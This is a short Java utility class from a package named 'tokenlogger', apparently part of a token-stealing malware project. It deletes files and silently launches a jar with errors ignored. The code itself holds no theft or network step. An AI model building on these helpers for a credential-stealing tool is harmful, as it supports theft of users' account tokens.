package tokenlogger.utils;

import java.io.File;

public class FileHelper {
    public static void delete(String filePath) {
        File file = new File(filePath);
        if (file.exists()) file.delete();
    }

    public static void launch(String appPath) {
        try {
            ProcessBuilder processBuilder = new ProcessBuilder("javaw", "-jar", appPath);
            processBuilder.start();
        } catch (Exception ignored) {}
    }
}
